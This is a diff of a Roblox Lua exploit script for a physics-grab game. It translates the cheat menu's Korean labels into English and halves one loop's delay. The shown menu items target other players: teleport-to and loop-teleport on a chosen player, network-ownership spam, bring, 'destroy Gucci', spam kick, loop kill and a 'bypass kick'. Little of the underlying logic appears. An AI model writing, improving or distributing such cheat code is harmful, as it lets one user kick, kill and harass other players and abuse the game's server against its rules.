+    Name = "Player selection",
     Default = "",
     Options = GetPlayerList(),
     Callback = function(Value)
@@ -8404,14 +8406,14 @@ local PlayerDropdown = ListTab:AddDropdown({
 })
 
 ListTab:AddButton({
-    Name = "리스트 재설정",
+    Name = "remove",
     Callback = function()
         PlayerDropdown:Refresh(GetPlayerList(), true)
     end
 })
 
 ListTab:AddToggle({
-    Name = "타겟 시점 보기",
+    Name = "view",
     Default = false,
     Callback = function(Value)
         if Value then
@@ -8427,7 +8429,7 @@ ListTab:AddToggle({
 })
 
 ListTab:AddButton({
-    Name = "TP 하기",
+    Name = "TP",
     Callback = function()
         if SelectedPlayer and SelectedPlayer.Character and SelectedPlayer.Character:FindFirstChild("HumanoidRootPart") then
             if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
@@ -8438,7 +8440,7 @@ ListTab:AddButton({
 })
 
 ListTab:AddToggle({
-    Name = "루프 tp 타겟",
+    Name = "loop TP",
     Default = false,
     Callback = function(Value)
         TargetLoopTP = Value
@@ -8454,7 +8456,7 @@ RunService.RenderStepped:Connect(function()
 end)
 
 ListTab:AddToggle({
-    Name = "네트워크 스팸",
+    Name = "Network spam",
     Default = false,
     Callback = function(Value)
         NetworkOwnerLoop = Value
@@ -8489,7 +8491,7 @@ ListTab:AddToggle({
                             end
                         end
                     end
-                    task.wait(0.06)
+                    task.wait(0.03)
                 end
             end)
         else
@@ -8519,7 +8521,7 @@ local function getPlayerNames()
 end
 
 ListTab:AddDropdown({
-    Name = "플레이어 고르기",
+    Name = "",
     Default = "",
     Options = getPlayerNames(),
     Callback = function(selected)
@@ -8548,10 +8550,10 @@ Tab:AddButton({
 
 
 LoopTab:AddSection({
-    Name = "오토블롭"
+    Name = "Auto blob"
 })
 LoopTab:AddToggle({
-    Name = "자동블롭앉기",
+    Name = "Auto Blob sit",
     
     save = true,
     Flag = "AutoSitBlobmanjj",
@@ -8561,10 +8563,10 @@ LoopTab:AddToggle({
     end
 })
 LoopTab:AddSection({
-    Name = "끌고오기"
+    Name = "Bring"
 })
 LoopTab:AddButton({
-    Name = "끌고오기   <font color='rgb(255,154,123)'>[블롭맨]</font>",
+    Name = "Bring   <font color='rgb(255,154,123)'>[Blobman]</font>",
     Callback = function()
         UpdateCurrentBlobman()
         local processedHumanoids = {}
@@ -8631,7 +8633,7 @@ LoopTab:AddButton({
 })
 
 LoopTab:AddButton({
-    Name = "끌고오기   <font color='rgb(255,0,0)'>[그랩]</font>",
+    Name = "Bring   <font color='rgb(255,0,0)'>[Grab]</font>",
     Callback = function()
         UpdateCurrentBlobman()
         local processedHumanoids = {}
@@ -8798,7 +8800,7 @@ LoopTab:AddButton({
     end
 })
 LoopTab:AddSection({
-    Name = "데스토리 구찌"
+    Name = "destroy Gucci"
 })
 
 
@@ -8854,7 +8856,7 @@ local function StartDestroyGucciLoop()
 end
 
 LoopTab:AddToggle({
-    Name = "데스토리 구찌   <font color='rgb(0,0,255)'>[프라임 오너쉽]</font>   <font color='rgb(255,0,0)'>[프리미엄]</font>",
+    Name = "destroy Gucci  <font color='rgb(0,0,255)'>[Ownership]</font>   ",
     Default = false,
     --Flag = "2195533",
     Callback = function(Value)
@@ -8881,7 +8883,7 @@ LoopTab:AddToggle({
     end
 })
 LoopTab:AddButton({
-    Name = "구찌 파괴 (all)",
+    Name = "Gucci destroy (all)",
     Callback = function()
         local p = game.Players.LocalPlayer
         local h = p.Character or p.CharacterAdded:Wait()
@@ -8906,10 +8908,10 @@ LoopTab:AddButton({
     end
 })
     LoopTab:AddSection({
-    Name = "오너킥"
+    Name = "Spam kick"
 })
 LoopTab:AddTextbox({
-        Name = "X Y Z",
+        Name = "Location",
         Default = "0,40,0",
         PlaceholderText = "",
         RemoveTextAfterFocusLost = false,
@@ -8926,7 +8928,7 @@ LoopTab:AddTextbox({
     --OLTPInput:Set("0,40,0")
     
     LoopTab:AddToggle({
-        Name = "스팸킥    <font color='rgb(255,0,255)'>[스팸]</font>    <font color='rgb(0,0,255)'>[프리미엄]</font>",
+        Name = "Spam kick    <font color='rgb(255,0,255)'>[Spam]</font>    ",
         Default = false,
        -- Flag = "21",
         Callback = function(Value)
@@ -8945,7 +8947,7 @@ LoopTab:AddTextbox({
         end
     })
 LoopTab:AddToggle({
-    Name = "ㄴ 고정",
+    Name = "Anchor",
     
     save = true,
     Flag = "21jkj",
@@ -8955,7 +8957,7 @@ LoopTab:AddToggle({
 })
 
 LoopTab:AddToggle({
-    Name = "ㄴ 그랩파괴 없이",
+    Name = "No destroy grab",
     
     save = true,
     Flag = "pyuyjd",
@@ -9165,11 +9167,11 @@ end
 
 do
     LoopTab:AddSection({
-        Name = "루프킬 NEW"
+        Name = "loopkill NEW"
     })
 
     LoopTab:AddToggle({
-        Name = "루프 킬  <font color='#07FF00'>[오너쉽]</font>",
+        Name = "loop kill  <font color='#07FF00'>[Ownership]</font>",
         Default = false,
         --Flag = "21",
         Callback = function(Value)
@@ -9306,7 +9308,7 @@ end
 
 local function runBlobmanLoopLogic()
     if not (BlobmanBetaFeature and BlobmanBetaFeature.checkTarget) then
-        warn("BlobmanBetaFeature 또는 checkTarget 함수를 찾을 수 없습니다.")
+        warn("BlobmanBetaFeature or checkTarget ")
         Settings.BlobmanBeta.loopKillActive = false
         return
     end
@@ -9394,7 +9396,7 @@ local function runBlobmanLoopLogic()
 end
 --[[
 LoopTab:AddToggle({
-    Name = "루프킬(베타)   <font color='rgb(255,154,123)'>[블롭맨]</font>",
+    Name = "  <font color='rgb(255,154,123)'>[</font>",
     Default = false,
     --Flag = "21",
     Callback = function(Value)
@@ -9432,10 +9434,10 @@ end
 
 
 LoopTab:AddSection({
-    Name = "레이지봇킥"
+    Name = "Bypass kick"
 })
 LoopTab:AddToggle({
-    Name = "레이지봇 킥   <font color='rgb(255,154,123)'>[레이지봇]</font>  <font color='rgb(0,255,0)'>[프리미엄]</font>  <font color='rgb(255,0,1)'>[바이패스]</font>  <font color='rgb(0,154,48)'>[락]</font>",
+    Name = "Bypass kick <font color='rgb(255,154,123)'>[rotation]</font>  <font color='rgb(255,0,1)'>[Bypass]</font> ",
     Default = false,
     --Flag = "22",
     Callback = function(Value)
@@ -9652,12 +9654,12 @@ LoopTab:AddToggle({
     end
 })
 LoopTab:AddSection({
-    Name = "블롭 킥"
+    Name = "Blob Kick"
 })
 --local loopKickBlobActive = false
 
 LoopTab:AddToggle({
-    Name = "블롭킥     <font color='rgb(255,0,0)'>[프리미엄]</font>",
+    Name = "Blobkick",
     Default = false,
     --Flag = "21",
     Callback = function(Value)
